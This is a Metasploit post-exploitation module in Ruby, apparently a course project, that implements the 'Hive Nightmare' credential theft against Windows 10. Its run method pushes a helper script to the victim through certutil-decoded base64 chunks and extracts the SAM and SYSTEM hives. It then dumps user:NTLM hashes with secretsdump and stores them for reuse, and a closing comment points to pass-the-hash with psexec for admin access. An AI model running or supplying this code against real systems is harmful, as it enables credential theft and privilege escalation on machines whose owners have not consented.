##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in an arbitrary TCP server.
#
###
class MetasploitModule < Msf::Post
    Rank = NormalRanking # https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking
  
    #
    # This exploit affects TCP servers, so we use the TCP client mixin.
    # See ./documentation/samples/vulnapps/testsrv/testsrv.c for building the
    # vulnerable target program.
    #
    # include Msf::Exploit::CmdStager
    include Msf::Post::Common
    include Msf::Post::File

    include Msf::Auxiliary::Report
  
    def initialize(info = {})
      super(
        update_info(
          info,
          # The Name should be just like the line of a Git commit - software name,
          # vuln type, class. Preferably apply
          # some search optimization so people can actually find the module.
          # We encourage consistency between module name and file name.
          'Name' => 'Hive Nightmare (assuming that is not trademarked or something)',
          'Description' => %q{
            This exploit will steal user:ntlm hashes from a low-privilege windows session that can be used to authenticate as an admin.
          },
          # 'License' => IDK_LICENSE,
          'Author' => ['ECE509 Group n'],
          'References' => [
            [ 'OSVDB', '12345' ],
            [ 'EDB', '12345' ],
            [ 'URL', 'http://www.example.com'],
            [ 'CVE', '1978-1234']
          ],
          'SessionTypes' => [ 'shell', 'meterpreter' ],
          'DisclosureDate' => 'TODO',
          'Targets' => [
            # Target 0: Win10
            [
              'Windows 10',
              {
                'Platform' => 'win',
                'Ret' => 0x41424344
              }
            ]
          ],
          'DefaultTarget' => 0,
          # https://github.com/rapid7/metasploit-framework/wiki/Definition-of-Module-Reliability,-Side-Effects,-and-Stability
          'Notes' => {
            'Stability' => [],
            'Reliability' => [],
            'SideEffects' => []
          }
        )
      )
      register_options(
        [
          OptString.new('REMOTE_WORKING_DIR',        [ true, "Directory to use to save intermediate files. Deleted when finished.", 'C:\\Users\\user' ]),
          OptString.new('REMOTE_PYTHON_INTERPRETER', [ true, "Path to remote python interpreter", 'C:\\py\\python\\python.exe' ]),
          OptString.new('LOCAL_PYTHON_INTERPRETER',  [ true, "Path to local python interpreter", 'python3' ]),

          # OptString.new('LOCAL_PYTHON_SCRIPT',       [ true, "Absolute local path to get_sam.py.", '/media/sf_share/hm_ms_exploit/get_sam.py' ]),
          # OptString.new('HM_MS_EXPLOIT_DIR',         [ true, "Path for exploit dir", "#{__dir__}" ]),
        ]
      )
    end
  
    def check
      CheckCode::Vulnerable
    end

    def send_file(session, f, remote_file)
      print_status("Sending #{f} to #{remote_file}.")

      text = File.read(f)
      text_b64 = Base64.encode64(text)
      
      session.run_single("del #{remote_file}.b64")
      i = 0
      text_b64.each_line { |line|
        l = line.strip()
        # print_status(l)
        if i == 0
          session.run_single("echo #{l} > #{remote_file}.b64")
        else
          session.run_single("echo #{l} >> #{remote_file}.b64")
        end
        i = i + 1
      }
      
      session.run_single("certutil -decode #{remote_file}.b64  #{remote_file}")
    end

    #
    # The exploit method connects to the remote service and sends 1024 random bytes
    # followed by the fake return address and then the payload.
    #
    def run
      # todo: make working_directory etc., options to the user via msfconsole
      pathsep = '\\'
      working_directory = datastore["REMOTE_WORKING_DIR"]
      remote_python_interpreter = datastore["REMOTE_PYTHON_INTERPRETER"]
      exploit_dir = __dir__
      local_get_sam_py = exploit_dir + '/get_sam.py'
      remote_get_sam_py = working_directory + pathsep + "get_sam.py"

      # print_status("Creating remote working directory.")
      # session.shell_command("rmdir /S /Q " + working_directory)
      # session.shell_command("mkdir " + working_directory)
      # session.shell_command("cd " + working_directory)

      # print_status("Uploading #{local_get_sam_py} to #{remote_get_sam_py}.")
      # session.cmd_upload(local_get_sam_py, remote_get_sam_py)
      send_file(session, local_get_sam_py, remote_get_sam_py)
      # get_sam_cmd_oneline = `#{local_python_interpreter} #{oneline_py} --file #{local_get_sam_py}`
      # get_sam_command = "#{remote_python_interpreter} -c #{get_sam_cmd_oneline}"
      get_sam_command = "#{remote_python_interpreter} #{remote_get_sam_py}"

      # print_status(get_sam_command)
      # session.shell_command("tar -xf get_sam.zip")

      #region DEBUGGING AFTER THIS STEP
      print_status("Executing get_sam.py on the remote.")
      session.run_single(get_sam_command)
      output = ""
      new_output = session.shell_read()
      while new_output
        output << new_output
        new_output = session.shell_read()
      end
      # print_status(output)
      # session.shell_command(get_sam_command)
      # session.shell_write(get_sam_command + "\r\n")
      # output = session.shell_read()
      # print_status(output)
      output_lines = output.split
      # get_sam.py prints the hashes encoded as base64 to stdout. We are stdout and capture that into output_lines
      # session.shell_command("rmdir /S " + working_directory) # clean up after ourselves
      sam_flag = "DUMP_SAM"
      sys_flag = "DUMP_SYS"
      sam_idx = 0
      sys_idx = 0

      sam_content = ""
      sys_content = ""

      i = 0
      for line in output_lines do
        i = i+1

        if line.start_with?(sam_flag)
          sam_idx = i
          print_status("Found SAM hive.")
          sam_content = output_lines[sam_idx]
        elsif line.start_with?(sys_flag)
          sys_idx = i
          print_status("Found SYSTEM hive.")
          sys_content = output_lines[sys_idx]
        end
      end

      sam_hive_b64 = sam_content[2..-2]
      sys_hive_b64 = sys_content[2..-2]

      unless sam_hive_b64.nil?
        sam_hive = Base64.decode64(sam_hive_b64)
      end
      unless sys_hive_b64.nil?
        sys_hive = Base64.decode64(sys_hive_b64)
      end
      #region DEBUGGING AFTER THIS STEP
      
      # # msf has a secretsdump.py script that's been modified so we can't use it directly. Save the hive files and call the default impacket secretsdump.py script to print the hashes. The output is saved into the dump var
      File.open("sam.hive", 'w') { |file| file.write(sam_hive) }
      File.open("sys.hive", 'w') { |file| file.write(sys_hive) }
      dump = `python3 secretsdump.py -sam sam.hive -sys sys.hive local`
      info_re = /(?<user>\w+):\d+:(?<ntlm_hash>\w+:\w+)/
      for entry in dump.split() do
        m = entry.match(info_re)
        if m
          print_status("Found user:ntlm_hash pair: #{m[:user]} : #{m[:ntlm_hash]}")
          # We matched a user:ntlm_hash pair.
          # Capture the credential and save it in the metasploit database
          opts = {
            status: Metasploit::Model::Login::Status::UNTRIED,
            host: session.target_host,
            address: session.target_host,
            username: m[:user],
            private_data: m[:ntlm_hash],
            private_type: :ntlm_hash,
            origin_type: :session, # :import, :manual, :service, :session
            session_id: datastore['SESSION'],
            post_reference_name: 'HiveNightmare',
            workspace_id: myworkspace_id
          }
          session.framework.db.create_credential(opts)
        end
      end

      # after the above captures the credentials into the database, check your msfdb for the username:ntlm hash pairs for the host you exploited and continue with your admin privileges.
      # e.g.
      # python3 psexec.py -hashes <ntlm_hash> user@ip_addr powershell.exe 
      # metasploit could use an auxillary admin module to do this within the console as a new session
    end
end
